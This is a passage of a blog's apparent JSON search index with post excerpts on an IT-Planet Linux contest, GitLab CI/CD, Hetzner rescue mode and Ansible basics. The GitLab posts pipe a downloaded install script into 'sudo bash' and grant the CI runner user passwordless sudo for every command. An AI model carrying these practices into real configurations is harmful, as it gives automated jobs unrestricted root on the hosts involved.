        "excerpt":"IT-Planet is an international olympiad for students and young specialists in IT. I participated in the contest of Linux Administration and I became one of the winners. The tasks that presented below have been in the final of the contest.   «IT-Планета» — одно из самых масштабных состязаний в области информационных технологий, учрежденных в России. Учредителями конкурсов являются ведущие российские и международные ИТ-компании: 1С, Huawei, Cisco, Oracle, ГНУ/Линуксцентр и СКБ Контур. Олимпиада проводится по нескольким направлениям.   Я участвовал в конкурсе по номинации “Администрирование Linux”, прошел несколько отборочных этапов и стали одним из победителей в финальных соревнованиях. И здесь решил выложить сами задания финала, которые показались мне достаточно интересными. Если найду время - выложу и решения.      В нашем распоряжении была машина с OC Centos 7 минимальной конфигурации, подключенная физически к интернету. Необходимо было:     авторизоваться в системе, взломав пароль пользователя root   починить сломанные настройки сети   найти веб-сервер в локальной сети, на котором лежат задания   скачать текстовый файл с заданиями и начать их решать      Задания финала конкурса “Администрирование Linux”    Представиться в /root/motd      Не забывайте, что ваша рабочая станция после перезапуска должна автоматически  подключиться к сети.       Нужно создать раздел на диске размером 1000MB, примонтировать в /data/            Диск должен монтироваться при старте системы       Должны быть приняты меры на случай смены имени диска           Завести пользователей orta, atmos, hexen, plyaski, ai            orta, atmos должны иметь доступ read в /data       ai и plyaski rw доступ       Чтобы избежать переполнения раздела, нужно выставить квоту на запись для юзеров ai и plyaski, soft 7000kb, hard 8000kb           Настроить nfs-server            Каталог /var/nfs должен быть доступен для монтирования из локальной сети       root доступ должен быть отключен       пользовательская авторизация включена       firewall должен работать           Настроить кеширующий dns-сервер unbound на локальную сеть.            В качестве forward-zone использовать 8.8.8.8 / 8.8.4.4       запросы должны приниматься только из подсети 192.168.171.0/24           Юзеру hexen ограничить использование CPU до 10% а MEM до 128MB            проверка будет производиться приложением stress/stress-ng           Запустить в контейнере (docker/lxc) socks5-прокси сервер с авторизацией по логин:пароль (it:planet), порт 1080            Проверить работоспособность прокси при помощи curl/wget/aria2/etc                Установить и настроить prometheus для сбора метрик с рабочей станции сервис должен работать на стандартном порту (9090), отдавать базовую информацию о машине, быть доступным из локальной сети.       На сервере с задачами находится файл answers.txt Содержит он вопросы восстановления паролей у пользователей почтового сервиса. Для удобства обработки списка нужно написать скрипт, который            Забирает список с сервера       На лету преобразовывает его в json (реализация принимается на bash, python, готовый скрипт положить в /root/answer_to_json.py,{sh})       json сохранить в /root/result.json       Бонусный балл можно заработать отфильтровав наиболее редкие вопросы восстановления (результат положить в /root/answers_filtered.txt)                На сервере с заданиями можно обнаружить странный архив botnet.tar.gz с бинарниками, происхождение и назначение которых вам неизвестны. После краткого расследования выяснилось, что злоумышленник проник в систему, потому что у одного из пользователей логин совпадал с паролем. Есть подозрение, что это часть какого-то ботнета. Задача собрать как можно больше информации о бинарном файле, о том что делает программа, при возможности деанонимизировать автора. Информацию о файле и свои мысли записать в /root/botnet.answer       Все манипуляции с файлами из архива с ботнетом производить в контейнере. Выполнение на хост-системе ведет к дисквалификации.       ","categories": ["linux"],
        "tags": ["itplanet","contest","centos","linux"],
        "url": "https://gainanov.pro/eng-blog/linux/tasks-of-linux-contest-in-itplanet/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/tasks-of-linux-contest-in-itplanet-teaser.jpg"
      },{
        "title": "GitLab CI/CD",
        "excerpt":"Today I want to start writing a cycle of articles about CI/CD process with GitLab. Many developers use GitLab to store code and work together on one project (write and review code, make issues, user management, etc.). But it has many other built-in tools includes automate test and deploy process.   With Gitlab you can easily build, test and deploy your code. In our company we are using Gitlab CI/CD for a long time. I will share my experience with you.   So these topics will be described in next articles:     GitLab CI/CD. Main concepts and terms   GitLab CI/CD. Install and configure Runner   GitLab CI/CD. Create simple pipeline   GitLab CI/CD. Tips and tricks    Official documentation     GitLab CI/CD Documentation   Getting started with GitLab CI/CD   Configuration of your jobs with .gitlab-ci.yml   ","categories": ["devops"],
        "tags": ["gitlab","devops"],
        "url": "https://gainanov.pro/eng-blog/devops/gitlab-ci-main/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/gitlab-ci-teaser.png"
      },{
        "title": "GitLab CI/CD. Main concepts and terms",
        "excerpt":"If you want to use Continuous Integration (CI) and Continuous Delivery (CD) services you need to know basic terms using in GitLab. I selected the foremost ones and set links to the description and additional information about them.   Configuration file  For using a CI/CD service you need to create a .gitlab-ci.yml file to the root directory of your repository. This file is used by GitLab Runner to manage your project’s jobs and stored in a YAML format.   Runner  GitLab Runner is a daemon in a host machine that is used to running your jobs and send the results back to GitLab. It permanently holds a connect with Gitlab. When a user runs job by pipeline Runner executes commands from .gitlab-ci.yml on the host.   Job  Jobs are set of commands that stored in section script in a config file. GitLab Runner runs jobs in a host machine. Each job is run independently of each other. The most popular jobs are a build_web_app1, build_web_app2, prepare, test, deploy, and etc.   Stage  A stage allows to group jobs, and jobs of the same stage are executed in parallel. Jobs of the next stage are run after the jobs from the previous stage complete successfully.   Pipeline  A pipeline is a group of jobs that get executed in stages (batches). All of the jobs in a stage are executed in parallel and if they all succeed the pipeline moves on to the next stage. If one of the jobs fails the next stage is not (usually) executed. You can access the pipelines page in your project’s Pipelines tab.   Artifact  An artifact is a list of files and directories which are attached to a job after it completes successfully. The uploaded artifacts will be kept in GitLab during expiry period. You can download the artifacts archive or browse its contents in Job Info page.   Environment  GitLab provides a full history of your deployments per every environment. Environments are like tags for your CI jobs, describing where code gets deployed. GitLab keeps track of your deployments, so you always know what is currently being deployed on your servers. For example, you can create and use typical environments - production and staging.   Dependency  When defined jobs exist in a dependency block of your .gitlab-ci.yml the Runner should be download all artifacts before start the current job. It can be used to divide build and deploy jobs for example. The deploy job often uses generated artifacts on previous stages.   Next post will describe how to install and configure a GitLab Runner for using it in your first pipeline.   ","categories": ["devops"],
        "tags": ["gitlab","devops"],
        "url": "https://gainanov.pro/eng-blog/devops/gitlab-ci-main-concepts/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/gitlab-ci/gitlab-ci-devops.png"
      },{
        "title": "GitLab CI/CD. Install and configure Runner",
        "excerpt":"In GitLab Runners run the jobs that you define in .gitlab-ci.yml. A Runner can be a virtual machine, a VPS, a bare-metal machine, a docker container or even a cluster of containers. GitLab and the Runners communicate through an API, so the only requirement is that the Runner’s machine has Internet access.   The official Runner supported by GitLab is written in Go and its documentation can be found at https://docs.gitlab.com/runner/.   In order to have a functional Runner you need to follow two steps:     Install it   Configure it   Next I’ll show you how to install and configure the latest GitLab Runner with shell executor in CentOS system. Additional steps you can find in official docs.   Install Runner      Add GitLab’s official repository (for RHEL/CentOS/Fedora):     curl -L https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.rpm.sh | sudo bash           Install the Runner:     yum install -y gitlab-runner           Configure Runner   Register Runner   Registering a Runner is the process that binds the Runner with a GitLab instance.   You can register a Runner in interactive mode with a command:  gitlab-runner register   And reply to the questions of the wizard.   But I would prefer to register it with inserting answers in parameters:  gitlab-runner register -n \\   --url \"https://YOUR_GITLAB_URL/\" \\   --registration-token \"XXXXXXXXXXXXXXXXXXXXXXX\" \\   --description \"nginx\" \\   --tag-list \"nginx-shell\" \\   --executor \"shell\" \\   --limit 1   Don’t forget place your toker. It stored in Admin Area ➔ Overview ➔ Runners:   https://YOUR_GITLAB_URL/admin/runners      And set the correct description and tags. I prefer to use a hostname as a description. I named it nginx because I run it on Nginx server. And set up tags. I suggest use host + executor as a tag.   Start Runner  gitlab-runner start   Check a status of a service:  # gitlab-runner status gitlab-runner: Service is running!   Show configured runners on the host:  # gitlab-runner list Listing configured runners                          ConfigFile=/etc/gitlab-runner/config.toml host1                                                 Executor=shell Token=XXXXXXXXXXXXXXXXXXXXXXX URL=https://YOUR_GITLAB_URL/   After that I usually change a type of a Runner from a shared into a specific.   Converting Runner type   Set up the current Runner as a specific one to deny to use a Runner of all projects. Just choose our new Runner in Admin Area and determine some project or projects with it.   Once the Runner has been set up, you should see it on the Runners page of your project, following Settings ➔ CI/CD:      After that you can configure your CI process in a .gitlab-ci.yml file with using tags to select specific Runners. For example:  example_job:   tags:     - nginx-shell   script:     - execute_something_script   Next post will help you to write a basic CI/CD configuration.   ","categories": ["devops"],
        "tags": ["gitlab","devops","centos"],
        "url": "https://gainanov.pro/eng-blog/devops/gitlab-ci-runner-install/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/gitlab-ci/gitlab-ci-runner-centos.png"
      },{
        "title": "GitLab CI/CD. Create simple pipeline",
        "excerpt":"Today I want to show you how to build and run a simple web application with pipelines. I wrote an example Java application to demonstrate a possibility of CI. The application code is placed here.   For using it in GitLab just clone and add as new project.     About project   This is a typical and simple web application that shows a web page with “Hello world” when a user gets http://localhost:8081/ from browser. Firstly you should compile a project with Maven. In the result of it you have got a file hello.war. For running the app copy this war file into a webapps folder and run Tomcat WebServer.   Runner host preparing   It supposes you have configured a shell Runner and have installed Docker.   After that for allowing to manage docker containers by Runner you should add a gitlab-runner user into docker group.  usermod -a -G docker gitlab-runner   In addition I setup gitlab-runner as sudo user to run protected linux commands without user passwords. Just add a next row into a file with a command sudo visudo -f /etc/sudoers.d/gitlab-runner  gitlab-runner ALL=(ALL) NOPASSWD: ALL   In the end, enable a specific Runner to this project if you didn’t do that yet.      Writing pipeline   In this project I want to use two stages to build and deploy an application.      The stage deploy has two jobs to deploy the app into a stand and production servers. Runners on these servers have tags prod-shell and stand-shell. The deploy to the production server requires a manual action. To build an app are used a docker maven container. The app is deploying with tomcat container.   Thus the next code will configure the defined pipeline. It requires to be inputted in .gitlab-ci.yml:  stages:   - build   - deploy  build_app:   stage: build   dependencies: []   tags:   - stand-shell   script:   - docker run -i --rm --name hello-maven -v ${PWD}:/hello -w /hello maven       mvn clean install   - cp target/hello.war hello.war   - docker run -i --rm --name hello-maven -v ${PWD}:/hello -w /hello maven       mvn clean   artifacts:     paths:     - hello.war     expire_in: 1 week  deploy:stand:   stage: deploy   dependencies:   - build_app   tags:   - stand-shell   script:   - docker run -d --rm --name hello-tomcat-${CI_COMMIT_SHA:0:8} -P       -v ${PWD}/hello.war:/usr/local/tomcat/webapps/hello.war          tomcat:9.0-jre8-alpine   - docker ps -f \"name=hello-tomcat-${CI_COMMIT_SHA:0:8}\" --format '{{.Ports}}'  deploy:prod:   stage: deploy   when: manual   dependencies:   - build_app   tags:   - prod-shell   script:   - docker run -d --rm --name hello-tomcat-${CI_COMMIT_SHA:0:8} -P       -v ${PWD}/hello.war:/usr/local/tomcat/webapps/hello.war          tomcat:9.0-jre8-alpine   - docker ps -f \"name=hello-tomcat-${CI_COMMIT_SHA:0:8}\" --format '{{.Ports}}'   In the result we have an automation process that builds and deploy the web app. The app is deployed to stand host for test purposes after every commit into a repo.      The result pipeline is:       The app can be accessed by IP and PORT.  The PORT are dynamically generated and are showed in the deploy:stand job result:      In my job output port is 32768. And the web app can be accessed by:      With this configuration you have tried to use CI/CD process with GitLab. Don’t forget this simple pipeline doesn’t provide jobs to stop stands. You should are stopping unused docker containers yourself.   Next you can change it to your complex configuration for own purposes.   In the future I will explain how to use Ansible for CI/CD in the script block. It useful if you have a complex pipeline and you want write readable scripts.   ","categories": ["devops"],
        "tags": ["gitlab","devops","java"],
        "url": "https://gainanov.pro/eng-blog/devops/gitlab-ci-create-first-pipeline/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/gitlab-ci/gitlab-ci-simple-pipeline.png"
      },{
        "title": "Work with host system in Hetzner Rescue Mode",
        "excerpt":"The Hetzner Rescue System is a Linux live environment that gives administrative access to you for your server. It helps to repair an installed system, to check file systems or to install a new operating system.   Problem   I show you an example. There is a host with installed CentOS 7 with SWRAID 1 and LVM. I can’t get a remote access by ssh (because I’ve forgotten the root password):   $ ssh root@xxx.xxx.xxx.xxx root@xxx.xxx.xxx.xxx's password: Permission denied, please try again. root@xxx.xxx.xxx.xxx's password: Permission denied, please try again. root@xxx.xxx.xxx.xxx's password: Permission denied (publickey,password).   The string xxx.xxx.xxx.xxx is a public IP of the remote server. Let’s see what I do in this situation.   Instructions      Activating a rescue mode for selected server in Hetzner web panel. Choose your ssh key for connecting to the rescue server without password.         Reset the server: select first or second option    The rescue system will be loaded after the server reboot. And we can connects to it with our ssh key (the key that we inserted on step 1)      Connect to the server by ssh.   Where is xxx.xxx.xxx.xxx public IP of the server (you can find it in the web panel)  $ ssh root@xxx.xxx.xxx.xxx   The server will return some information  -------------------------------------------------------------------    Welcome to the Hetzner Rescue System.    This Rescue System is based on Debian 8.0 (jessie) with a newer   kernel. You can install software as in a normal system.    To install a new operating system from one of our prebuilt   images, run 'installimage' and follow the instructions.    More information at http://wiki.hetzner.de  -------------------------------------------------------------------  Hardware data:     CPU1: AMD Ryzen 7 1700X Eight-Core Processor (Cores 16)    Memory:  64370 MB    Disk /dev/sda: 512 GB (=&gt; 476 GiB)    Disk /dev/sdb: 512 GB (=&gt; 476 GiB)    Total capacity 953 GiB with 2 Disks  Network data:    eth0  LINK: yes          MAC:  00:00:00:00:00:00          IP:   xxx.xxx.xxx.xxx          IPv6: 1001:1001:1001:1001::2/64          RealTek RTL-8169 Gigabit Ethernet driver      Because I use LVM in the host system, I run commands to scan disk for  Volume Groups and Physical Volumes.   root@rescue ~ # vgscan   Reading all physical volumes.  This may take a while...   Found volume group \"vg0\" using metadata type lvm2  root@rescue ~ # pvscan   PV /dev/md1   VG vg0   lvm2 [476,31 GiB / 341,31 GiB free]   Total: 1 [476,31 GiB] / in use: 1 [476,31 GiB] / in no VG: 0 [0   ]      Fine. Was founded a group named vg0. It is a group that I want to mount. Activate it.   root@rescue ~ # lvm vgchange -a y 4 logical volume(s) in volume group \"vg0\" now active   And view a result of it.  root@rescue ~ # lvscan ACTIVE            '/dev/vg0/root' [10,00 GiB] inherit ACTIVE            '/dev/vg0/tmp' [5,00 GiB] inherit ACTIVE            '/dev/vg0/home' [20,00 GiB] inherit   We see the a familiar file structure, don’t it?      Now display the devices that you can mount.   root@rescue ~ # ls -l /dev/mapper/vg* lrwxrwxrwx 1 root root 7 Sep 11 07:26 /dev/mapper/vg0-home -&gt; ../dm-2 lrwxrwxrwx 1 root root 7 Sep 11 07:26 /dev/mapper/vg0-root -&gt; ../dm-0 lrwxrwxrwx 1 root root 7 Sep 11 07:26 /dev/mapper/vg0-tmp -&gt; ../dm-1      Then, mount the desired MD device of the host server.   I will mount / in the host server as /mnt in the rescue server (current session)   root@rescue ~ # mount /dev/mapper/vg0-root /mnt   Now we can work with files as usual  root@rescue ~ # ls -l /mnt total 1,2M lrwxrwxrwx  1 root root    7 May 14 08:39 bin -&gt; usr/bin drwxr-xr-x  2 root root 4,0K Sep 10 16:08 boot drwxr-xr-x  2 root root 4,0K Sep 10 16:08 dev drwxr-xr-x 71 root root 4,0K Sep 10 16:09 etc drwxr-xr-x  2 root root 4,0K Sep 10 16:08 home -rw-r-----  1 root root  733 Sep 10 16:09 installimage.conf -rw-r-----  1 root root 1,2M Sep 10 16:09 installimage.debug lrwxrwxrwx  1 root root    7 May 14 08:39 lib -&gt; usr/lib lrwxrwxrwx  1 root root    9 May 14 08:39 lib64 -&gt; usr/lib64 drwx------  2 root root  16K Sep 10 16:07 lost+found drwxr-xr-x  2 root root 4,0K Apr 11 06:59 media drwxr-xr-x  2 root root 4,0K Apr 11 06:59 mnt drwxr-xr-x  2 root root 4,0K Apr 11 06:59 opt drwxr-xr-x  2 root root 4,0K Sep 10 16:08 proc dr-xr-x---  4 root root 4,0K Sep 10 16:08 root drwxr-xr-x  3 root root 4,0K Sep 10 16:08 run lrwxrwxrwx  1 root root    8 May 14 08:39 sbin -&gt; usr/sbin drwxr-xr-x  2 root root 4,0K Apr 11 06:59 srv drwxr-xr-x  2 root root 4,0K Sep 10 16:08 sys drwxr-xr-x  2 root root 4,0K Sep 10 16:08 tmp drwxr-xr-x 13 root root 4,0K May 14 08:39 usr drwxr-xr-x 19 root root 4,0K May 14 08:39 var      Make some actions with host files.   As I said I’ve lost a control to the server. Now I want to add the ssh-key for access without password to the host.   Edit a file .ssh/authorized_keys, and add our public key in it.   root@rescue ~ # vi /mnt/root/.ssh/authorized_keys  root@rescue ~ # ls -l /mnt/root/.ssh/authorized_keys -rw-r--r-- 1 root root 747 Sep 11 07:28 /mnt/root/.ssh/authorized_keys  root@rescue ~ # chmod 600 /mnt/root/.ssh/authorized_keys  root@rescue ~ # ls -l /mnt/root/.ssh/authorized_keys -rw------- 1 root root 747 Sep 11 07:28 /mnt/root/.ssh/authorized_keys      In the finish of work with the host files unmount the root device.   root@rescue ~ # umount /dev/mapper/vg0-root   And deactivate volume group vg0  root@rescue ~ # lvm vgchange -a n vg0   0 logical volume(s) in volume group \"vg0\" now active      Now you can exit from rescue mode. Just run a reboot command.   root@rescue ~ # reboot  Broadcast message from root@rescue on pts/0 (Tue 2018-09-11 08:58:23 CEST):  The system is going down for reboot NOW!      That’s all. The server will reboot and the host system will start.   Try to connect.  $ ssh root@xxx.xxx.xxx.xxx Last failed login: Mon Sep 10 16:10:44 CEST 2018 from yyy.yyy.yyy.yyy on ssh:notty There was 1 failed login attempt since the last successful login.  [root@CentOS-75-64-minimal ~]# hostname CentOS-75-64-minimal   Conclusion   In my practice I often repair system in rescue mode. With rescue I monitor the logs when system didn’t start. It’s very useful tool for fix mistakes with network and firewall settings.   Additional information   lvm(8) - Linux man page Hetzner Rescue System - Official Information Hetzner Rescue System/en - Official Manual   ","categories": ["linux"],
        "tags": ["centos","linux","hetzner"],
        "url": "https://gainanov.pro/eng-blog/linux/hetzner-rescue-mode/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/hetzner-rescue/hetzner-rescue-teaser.jpg"
      },{
        "title": "Ansible. Why I use it?",
        "excerpt":"As a sysadmin, I often connect to servers that run the same commands by SSH. This is could be updated packages, edit configures, copy files or some other things. And I should do it many times to every server. But with tools named configuration management tools, this is no need anymore. Also, have not required complex shell-scripts. Ansible is the tool that helps me easy maintain many servers and save my time.   Like Chef, Puppet, CFEngine Ansible helps for people involved in DevOps automate them regular actions. Ansible has a great opportunities and big community. And below I describe why to choose it and why you should to try it if you work manually yet.   1. Simplicity   The first reason is Ansible easy to use. Nothing additional configures requires on remote machines. Ansible manages machines in an agent-less manner. Thus no additional custom security infrastructure, so it’s easy to deploy. If you already have access to the server by ssh (of course you have it) you could use Ansible.   After add the information (name and IP) about servers into an inventory file could possible run ansible commands like this (reboot all servers):  ansible all -a \"reboot\" -s   2. Human readable   Ansible uses a very simple language (YAML) that allow you to describe your automation jobs in a way that approaches plain English. After shell-scripting uses breckets, quotes, commas and other signs I love it. It uses indentions in programs that beauty and easy to read. And if you not familiar with any programing language (Python, Ruby, etc..) you also read it with ease.   Next config (in Ansible it names a playbook) will copy local config file (sshd_config) of SSH daemon and restart the daemon.   - name: Copy SSH configure file   copy:     src: remote_ssh/sshd_config     dest: /etc/ssh/sshd_config     owner: root     group: root     mode: 0644  - name: Restart sshd   service:     name: sshd     state: restarted   And after run the playbook we have readable output log like this one:    3. Many modules   Ansible contains a giant toolbox of built-in modules, well over 750 of them. Modules are discrete units of code that can be used from the command line or in a playbook task. Also it possible to write own modules or execute any command from console in shell.   Executing a command that creating a replication slot on a remote host with psql console utility.   - name: create replication slot   shell: |     psql -U postgres -c \"SELECT * FROM pg_create_physical_replication_slot('{{ replica_host }}');\"   4. Rich documentation   I enjoy reading the documentation of Ansible. All functions are understanding quickly and better with many examples in the docs. And if I have a question StackOverflow have an answer on it often.   Thus, with this instrument my work was better and I can easily deploy many tasks on servers and repeat it many times with minimal additions.   Additional information      Ansible Documentation - Covers all Ansible options in depth. There are few open source projects with documentation as clear and thorough.   Ansible Glossary - If there is ever a term in this book you don’t seem to fully understand, check the glossary.   Getting Started with Ansible - A simple guide to Ansible’s community and resources.   Ansible for DevOps - this book helps reach an expert level of Ansible using.   Ansible - A Beginner’s Tutorial - youtube lessons about the basics of Ansible.   ","categories": ["devops"],
        "tags": ["ansible","devops"],
        "url": "https://gainanov.pro/eng-blog/devops/ansible-why-i-use-it/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/ansible-why-i-use-it.png"
      },{
        "title": "Ansible. Architecture",
        "excerpt":"Ansible is an automation engine that automates cloud provisioning, configuration management, application deployment, intra-service orchestration, and many other IT needs. This post is inspired an official documentation about architecture of Ansible. Many thoughts is perfect described in the docs, but I want to explain it in my words and collect all of my experience in one place. I hide details and concentrate on the base.   The main idea of Ansible is one or more the controller server, that needed for sending commands to the remote servers by SSH. It doesn’t require agents on remotes. All commands send throw secure network and the hosts run it. Only one thing is needed is Python interpreter. And it is installed on the every popular distributive of OS (Centos, Debian, etc.) by default.      Ansible based on the next terms: inventory, playbook, task, role, handler, module, template, facts and variables. This sequence could be continued but I think if you will know mean of the words you could use Ansible in major cases.   1. Inventory   Basically inventory is a file (by default, Ansible uses a simple INI format) that describes Hosts and Groups. It stores in file hosts. Also inventory can be a dynamic to flexible and customizable server infrastructure.   I prefer writing inventory in YAML format. A YAML version would look like:  all:   hosts:     mail.example.com:       ansible_host: 192.0.2.50       ansible_port: 5555   children:     webservers:       hosts:         foo.example.com:         bar.example.com:     dbservers:       hosts:         one.example.com:         two.example.com:         three.example.com:   In this inventory include two groups (webservers and dbservers) includes six hosts. There are two default groups: all and ungrouped. The parameters ansible_host and ansible_port explain how to connect to the mail server (by this IP and port). Also inventory can include variables for groups or individual hosts using in playbooks. And many other magic thing can be making with inventory.   Next command shows the hosts that includes into group dbservers:  ansible --list-host \"dbservers\"   For showing all hosts use it:  ansible --list-host \"*\"   For request what hosts will be using with selected playbook use next:  ansible-playbook &lt;playbook-name.yml&gt; --list-hosts   2. Playbook   Playbooks are the language by which Ansible orchestrates, configures, administers, or deploys systems. At a basic level, playbooks can be used to manage configurations of and deployments to remote machines.   Playbook basically consist of roles and tasks that will execute on the selected hosts.   There is the simplest playbook that ping the hosts in group webservers:  --- - hosts: webservers   tasks:     - name: test connection       ping:   For example this playbook was saved in the file test-connection-playbook.yml. Then we can execute it with next command:  ansible-playbook test-connection-playbook.yml   3. Task   Playbooks exist to run tasks. Tasks combine an action (a module and its arguments) with a name and optionally some other keywords. Handlers are also tasks, but they are a special kind of task that do not run unless they are notified by name when a task reports an underlying change on a remote system.   The example of a task has showed before in playbook section.   4. Role   Roles are ways of automatically loading certain tasks, variables and handlers based on a known file structure. Grouping content by roles also allows easy sharing of roles with other users.   Roles work only if you have prepared project files structure like this one:  test-connection-playbook.yml roles/    common/      tasks/         main.yml      handlers/      files/      templates/      ...   Roles expect files to be in certain directory names. Firstly is loading the file tasks/main.yml. It can load other files to have platform-specific tasks.   For using role in the playbooks need to add roles section into a playbook file. Also common practice for creating reusable playbooks is to define a variable in the playbook. See the example below.  --- - hosts: webservers   roles:     - role: common       vars:          dir: '/opt/a'          app_port: 5000   5. Handler   Handler is just like regular task in an playbook. It is only run if the task contains a notify directive and also indicates that it changed something. For example, if a config file is changed, then the task referencing the config file templating operation may notify a service restart handler.   --- - hosts: webservers   tasks:   - name: write the apache config file     template:       src: /srv/httpd.j2       dest: /etc/httpd.conf     notify:     - restart apache   handlers:     - name: restart apache       service:         name: httpd         state: restarted   6. Module   Modules are the units of work that Ansible ships out to remote machines. Once modules are executed on remote machines, they are removed, so no long running daemons are used. Ansible refers to the collection of available modules as a library.   Ansible contains a giant toolbox of built-in modules. And you can write you own module in any language, including Perl, Bash, or Ruby. Modules just have to return JSON.   Before running an action module check the current state of a host, service, file. And if it is in the required state the module wouldn’t change anything and returns the changed: false flag.   For example, the copy module can be used to copy files – and shows that files are only transferred if they are not already there:  $ ansible example.com -m copy -a \"src=some_config.conf dest=config.conf\" example.com | success &gt;&gt; {     \"changed\": false,     ... ...   7. Template   Ansible can easily transfer files to remote systems but often it is desirable to substitute variables in other files. Templates use the Jinja2 template engine and can also include logical constructs like loops and if statements. It used a template module in playbooks. It prefers to name template files with extension j2.   8. Facts   Before make changes Ansible connects to remote hosts and gather information about it: network interfaces, host states, operating system, and etc. Thus facts are simply things that are discovered about remote nodes. Facts are automatically discovered by Ansible when running plays by executing the internal setup module on the remote nodes. Also it can be manually disabled in the playbook with gather_facts: false parameters. And if you want only gather facts on selected hosts just run next command with setup module:  ansible all -m setup   9. Variables   As opposed to Facts, variables are names of values (they can be simple scalar value’s integers, booleans, strings) or complex ones (dictionaries/hashes, lists) that can be used in templates and playbooks. They are declared things, not things that are inferred from the remote system’s current state or nature (which is what Facts are).   Ansible uses variables to help deal with differences between systems. Vars need to make things repeatable. YAML supports dictionaries which map keys to values. For instance:  foo:   field1: one   field2: two   And for getting a value of the field2 used next reference foo.field2.   Once you have defined variables, you can use them in your playbooks using the Jinja2 templating system. Here is a simple Jinja2 template:  My amp goes to {{ max_amp_value }}  The same syntax is using in playbooks. More examples you can find in the docs.   So in the end I can only recommend Ansible to anyone who is dealing with configuration management and deployments. It is a certainly helpful tool. And it requires minimal actions in your servers to try it and use it.   Additional information      Ansible Documentation - Covers all Ansible options in depth. There are few open source projects with documentation as clear and thorough.   Ansible Glossary - If there is ever a term in this book you don’t seem to fully understand, check the glossary.   Getting Started with Ansible - A simple guide to Ansible’s community and resources.   Ansible for DevOps - this book helps reach an expert level of Ansible using.   Ansible - A Beginner’s Tutorial - youtube lessons about the basics of Ansible.   Ansible Architecture - an youtube video that explain the base of Ansible   ","categories": ["devops"],
        "tags": ["ansible","devops"],
        "url": "https://gainanov.pro/eng-blog/devops/ansible-architecture/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/ansible-architecture.png"
      },{
        "title": "Ansible. Getting started",
        "excerpt":"Installation   Ansible communicates with remote machines over SSH. Each host should be accessed by SSH. In the beginning sure that hosts has reached like this  $ ssh root@192.168.123.101 Last login: Wed Jan  9 14:04:15 2019 from localhost #  If you see it, it has enough to communicate with managed host 192.168.123.123 with Ansible.   Next step is installation Ansible to control machine. On CentOS (RHEL):  $ sudo yum install ansible   On Ubuntu (via APT) run these commands:  $ sudo apt-get update $ sudo apt-get install software-properties-common $ sudo apt-add-repository --yes --update ppa:ansible/ansible $ sudo apt-get install ansible   Configuration   Prepare Control host   By default, OpenSSH use options from file ~/.ssh/config. I recommend add information about remote host there. For instance:  Host websrv1 HostName 192.168.123.101 User root Port 43211  With it communication with host will be easy (ssh websrv1).   Configure Ansible   Create the directory that will include all playbooks and tasks. For example I create the ~/myansible dir. By default options are loading from file ansible.cfg in the current directory and after from system path (/etc/ansible/ansible.cfg). So have to create the ~/myansible/ansible.cfg file. And write next content into it:  [defaults] inventory      = hosts  There are means that inventory file was found in the file hosts from the current directory. It helps us for storing everything in one directory.   Edit Inventory   Use the simple inventory includes one host. Create a file hosts with next contents:  all:   hosts:     websrv1:   Test access   Ok, now we can run ansible task that will executed on remote host websrv1.   $ ansible websrv1 -m ping websrv1 | SUCCESS =&gt; {     \"changed\": false,     \"ping\": \"pong\" }   The SUCCESS status telling us that everything is fine and control machine can communicate with selected remote host.   Now run a live command on all of your nodes:  $ ansible websrv1 -a \"hostname\" websrv1 | SUCCESS | rc=0 &gt;&gt; stand   Congratulations! But Ansible is not just about running commands, it also has powerful configuration management and deployment features. Lets try to write an our playbook.   Write Playbook   Create a simple playbook that will install nginx web server and will start the daemon. Then test it in the browser. I will use a server with Debian system.   But before let explain what I did if ansible didn’t exist. I would connect to the server over SSH and install the nginx package with APT  $ ssh websrv1 root@websrv1:~# apt update Ign:1 http://mirror.yandex.ru/debian stretch InRelease Get:2 http://mirror.yandex.ru/debian stretch-updates InRelease [91.0 kB] Get:3 http://security.debian.org/debian-security stretch/updates InRelease [94.3 kB] Hit:4 http://mirror.yandex.ru/debian stretch Release Get:5 http://mirror.yandex.ru/debian stretch-updates/main Sources.diff/Index [6,640 B] Get:6 http://mirror.yandex.ru/debian stretch-updates/main amd64 Packages.diff/Index [6,640 B] Get:7 http://mirror.yandex.ru/debian stretch-updates/main Sources 2019-01-02-2012.38.pdiff [551 B] Get:7 http://mirror.yandex.ru/debian stretch-updates/main Sources 2019-01-02-2012.38.pdiff [551 B] Get:9 http://mirror.yandex.ru/debian stretch-updates/main amd64 Packages 2019-01-02-2012.38.pdiff [332 B] Get:9 http://mirror.yandex.ru/debian stretch-updates/main amd64 Packages 2019-01-02-2012.38.pdiff [332 B] Get:10 http://security.debian.org/debian-security stretch/updates/main Sources [188 kB] Hit:11 https://deb.nodesource.com/node_10.x stretch InRelease Get:12 http://security.debian.org/debian-security stretch/updates/main amd64 Packages [464 kB] Fetched 851 kB in 2s (329 kB/s) Reading package lists... Done Building dependency tree Reading state information... Done  root@websrv1:~# apt install -y nginx Reading package lists... Done Building dependency tree ... Setting up nginx (1.10.3-1+deb9u2) ...  After that I can see the a ‘hello’ page from Nginx by 192.168.123.101 local network address (it corresponds to the websrv1 host).      Good! Now the host websrv1 has work as real web server. Then write the same with Ansible’s playbook. Open the file ~/myansible/nginx-install.yml and add   - hosts: websrv1   tasks:     - name: Install nginx web server       apt:         pkg: nginx         state: installed         update_cache: true   We just tell Ansible the it should use an apt module and also update cache before. Ok, we clean our Debian system and restore it to the state when Nginx wouldn’t installed. Now we want to run this playbook. Use next command:  $ ansible-playbook websrv1 nginx-install.yml PLAY [websrv1] *********************  GATHERING FACTS ********************* ok: [websrv1]  TASK: [Install nginx web server] ********************* changed: [websrv1]  PLAY RECAP ********************* websrv1                        : ok=2    changed=1    unreachable=0    failed=0      Our task was executed and it changes something in the server. The flag changed is telling about it.  TASK: [Install nginx web server] ********************* changed: [websrv1]   If we open the browser and input the server IP we view the nginx ‘hello’ page. The same that we have before.   So we prepare the controller host for a big things. We installed Ansible, created a catalog (~/myansible) for the future complex playbooks, added a server in our host file. And we run simple task from playbook. Next, I recommend you to follow the documentation and learn more about playbooks.   Additional information      Getting Started with Ansible - A simple guide to Ansible’s community and resources.   Ansible Documentation - Covers all Ansible options in depth. There are few open 